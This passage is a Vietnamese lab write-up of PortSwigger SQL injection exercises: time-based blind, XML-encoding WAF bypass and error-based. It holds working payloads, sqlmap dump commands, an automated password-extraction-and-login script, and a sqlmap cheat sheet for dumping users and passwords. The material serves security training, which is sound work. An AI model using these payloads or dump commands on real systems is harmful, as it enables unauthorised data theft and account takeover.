- Thay lần lượt độ dài cho tới khi nhận giá trị 20 thì hệ thống xuất hiện delay rõ rệt, chúng ta có thể khẳng định mật khẩu người dùng administrator có đúng 20 ký tự.

![image](https://hackmd.io/_uploads/BykQb4R96.png)

Giờ ta sẽ tiến hành lấy từng ký tự của mật khẩu bằng payload:

```sql
'|| (SELECT CASE WHEN (substring(password,1,1) = 'a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- -
```

![image](https://hackmd.io/_uploads/Hy_eMERq6.png)

![image](https://hackmd.io/_uploads/H1DuGNA9p.png)

![image](https://hackmd.io/_uploads/Hy0OfVRca.png)

- sau hơn 2h đợi bruteforce mình được password là: **jhei5dcbd4selcifhb59**

![image](https://hackmd.io/_uploads/SJxdqrC9T.png)

Khi đó ta có tài khoản **`administrator:jhei5dcbd4selcifhb59`** và đăng nhập để solve challenge.

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình tấn công time-base vào Trackingid để tìm các database được dùng trong bài này với lệnh

```sql!
sqlmap  -u "https://0aa6001403ccba888414dc7a0061001a.web-security-academy.net/" --cookie "TrackingId=pcSy1Ri7YCMxmJVK*; session=0dNnfgTga9vjmLkaD1y3ZQIDrkD1OM" --dbms=PostgreSQL --technique=T  --risk=3 --level=5 --threads=10 --batch --dbs
```

![ảnh](https://hackmd.io/_uploads/S1ERf7U3a.png)

- và mình được database **public**
- tiếp đó mình liệt kê các tables trong database này bằng lệnh

```sql!
sqlmap  -u "https://0aa6001403ccba888414dc7a0061001a.web-security-academy.net/" --cookie "TrackingId=pcSy1Ri7YCMxmJVK*; session=0dNnfgTga9vjmLkaD1y3ZQIDrkD1OM" --dbms=PostgreSQL --technique=T  --risk=3 --level=5 --threads=10 --batch -D public --tables
```

![ảnh](https://hackmd.io/_uploads/Sks74QL36.png)

và mình được 2 tables trong đó có table users

- mình dump table này ra xem bằng lệnh

```sql!
sqlmap  -u "https://0aa6001403ccba888414dc7a0061001a.web-security-academy.net/" --cookie "TrackingId=pcSy1Ri7YCMxmJVK*; session=0dNnfgTga9vjmLkaD1y3ZQIDrkD1OM" --dbms=PostgreSQL --technique=T  --risk=3 --level=5 --threads=10 --batch -D public -T users --dump
```

- do trờ gen ra toàn bộ bảng khá lâu nên sqlmap tìm được pass của admin là mình submit luôn

![ảnh](https://hackmd.io/_uploads/rkE5Om82T.png)

![ảnh](https://hackmd.io/_uploads/SyE6imU2a.png)

và mình đi đăng nhập với tài khoản **administrator:qs8naxzrzqlhokqomwv9** và solve được lab này

![ảnh](https://hackmd.io/_uploads/rJEFim83p.png)

- đợi đến cuối mình được bảng

![ảnh](https://hackmd.io/_uploads/H14lzE8hT.png)

## 15. Lab: SQL injection with filter bypass via XML encoding

link: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

### Đề bài

![image](https://hackmd.io/_uploads/BJ9baZC96.png)

### Phân tích

- Lab trên chứa một lỗ hổng SQL Injection ở tính năng kiểm tra hàng hóa. Kết quả của query trả về cho người dùng, nhiệm vụ của ta là phải lấy được thông tin từ bảng users, từ đó lấy được tài khoản và mật khẩu của admin.
- Đầu tiên ta cần phải xác định xem UNION có thể lấy được bao nhiêu cột, tuy nhiên khi mình sử dụng câu lệnh `' UNION SELECT NULL` và chữ S được mã hóa theo Html Encode, trang web đã phát hiện ra mình thực hiện tấn công trang web và nó đã in ra như này:

![image](https://hackmd.io/_uploads/ryrA1z0q6.png)

### Khai thác

- mình không thể tấn công theo cách bình thường như này, nên mình cần phải sử dụng thêm extension có trong BurpSuite là Hackvertor, công cụ này sẽ biến đổi payload và mã hóa theo nhiều dạng khác nhau, tiêu biểu như: base64,… Ở đây em sẽ encode câu query của mình theo dạng hex_entities để vượt qua được tường lửa của trang web:

![image](https://hackmd.io/_uploads/Hk2_EXRc6.png)

![image](https://hackmd.io/_uploads/rJyqEQCqa.png)

với payload:

```sql!
<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
```

![image](https://hackmd.io/_uploads/H11i4mC96.png)

mình đăng nhập tài khoản admin **administrator~896dxvlgnufozop80fhs** và solve được lab

![image](https://hackmd.io/_uploads/ryOpD7C9p.png)

## 16. Lab: Visible error-based SQL injection

link: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

### Đề bài

![image](https://hackmd.io/_uploads/S1d9_XAq6.png)

### Phân tích

mình dùng câu lệnh `'+CAST((SELECT password FROM users) AS int)--+-`

![image](https://hackmd.io/_uploads/H1eKKQCqT.png)

### Khai thác

- Giờ để lộ ra mật khẩu của admin, ta phải làm cách nào đó để nó lộ ra kết quả của phép CAST này, và mình có payload sau: `'+AND+1=CAST((SELECT username FROM users) AS int)--+-`

![image](https://hackmd.io/_uploads/SJCbo7R9a.png)

- error xổ ra kèm theo tên của người đầu trong bảng users là administrator, giờ mình đổi tham số username bằng password thì ta sẽ có mật khẩu tương ứng của administrator: `'+AND+1=CAST((SELECT password FROM users LIMIT 1) AS int)--+-`

![image](https://hackmd.io/_uploads/Hk-ps7C9T.png)

mình được mật khẩu là **y0xotr2yi16613vw3354**

đăng nhập với tài khoản **administrator:y0xotr2yi16613vw3354** và mình solve được lab

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a4e000f037eb3c083b9377b00be00c3.web-security-academy.net'

session = requests.Session()

payload = "'+AND+1=CAST((SELECT password FROM users LIMIT 1) AS int)--+-"
cookies = {
    'TrackingId' : payload,
}

response = session.get(
    url + "/filter?category=Gifts",
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
pattern = r"\w{20}"
match = re.search(pattern, response.text)
account = match.group()
print("mật khẩu là: ", account)

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf= soup.find('input', {'name': 'csrf'})['value']
data= {
    'username' : 'administrator',
    'password' : account,
    'csrf' : csrf,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SJYsp7A5a.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/H14y0XC9p.png)

### SQLMAP

- đầu tiên mình liệt kê các database trong lab này với lệnh

```sql!
sqlmap  -u "https://0a73001803e38b56807d309000da0014.web-security-academy.net/" --cookie "TrackingId=AF9LPLcvwLo3bB3J*; session=BqpZ5ZJTG9g7jXqByGcfWsBu7Vqy02" --technique=BE --dbms=PostgreSQL  --risk=3 --threads=10 --level=5  --batch --dbs
```

![ảnh](https://hackmd.io/_uploads/S1gevNU2p.png)

- sqlmap ko thể detect

## Cấu trúc lệnh trong SQLMAP

```javascript!
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```

```java!
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```

```sql!
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```

### Injections in Headers and other HTTP Methods

```sql!
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```

### POST Request Injection

```sql!
sqlmap -u "http://example.com" --data "username=*&password=*"
```

- Đầu tiên ta chạy thử với dữ liệu nhập vào bình thường, sau đó bắt requests với burpsuite và lưu vào file. Sqlmap có tính năng rất tiện lợi đó là đọc request từ file burp và thực hiện khai thác.
- VD: `sqlmap -r dum -p id --technique=T`
  - `-r` dum đọc file dum
  - `-p` chỉ định param để sqlmap chèn payload vào
  - `--technique` là kiểu có lỗi SQL mặc định là BEUSTQ ở đây tôi chỉ muốn Time-base nên tôi để là T
- Đã xác định có lỗi tiếp theo ta có thể tiến hành khai thác sâu hơn như: dump tất cả tên database, hiển thị bảng, hiển thị cột, ...
  - Hiển thị tất cả tên database: `sqlmap -r dum -p id --technique=T --dbs --threads 10`
  - Hiển thị tất cả table trong database: `sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> --tables`
  - Hiển thị tất cả column có trong table: `sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> T <tên table> --columns`
  - Dump dữ liệu của columns, table, database bất kỳ

```sql
# dump một cột
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> T <tên table> -C <tên column> --dump
#dump một table
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> T <tên table> --dump
#dump database
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> --dump
```

- Sau đây là bảng thống kê một số tham số thường sử dụng trong quá trình tấn công bằng công cụ Sqlmap:

| Tham số      | Công dụng                                |
| ------------ | ---------------------------------------- |
| -u           | URL mục tiêu                             |
| -r           | Gói tin mục tiêu                         |
| --current-db | Truy xuất tên các cơ sở dữ liệu hiện tại |
| -D           | Tên cơ sở dữ liệu mục tiêu               |
| --tables     | Truy xuất tên các bảng                   |
| -T           | Tên bảng mục tiêu                        |
| --columns    | Truy xuất tên các cột                    |
| -C           | Tên cột mục tiêu                         |
| --dump-all   | Truy xuất tất cả dữ liệu                 |
| --dump       | Truy xuất dữ liệu mục tiêu               |

## Chú thích

- `substring((select database()),1,1)='a'`
  - select database() trả về tên của cơ sở dữ liệu hiện tại.
  - substring(string, start, length) là một hàm trong SQL dùng để trích xuất một phần của chuỗi string bắt đầu từ vị trí start với chiều dài length.
  - Trong trường hợp này, substring((select database()),1,1) có nghĩa là trích xuất một ký tự từ chuỗi kết quả của select database(). Cụ thể, với start là 1 và length là 1, nó sẽ trả về ký tự đầu tiên của tên cơ sở dữ liệu hiện tại.

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">

## Tài liệu tham khảo

- https://whitehat.vn/threads/tim-hieu-ve-sql-injection-va-cach-phong-chong.11591/
- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
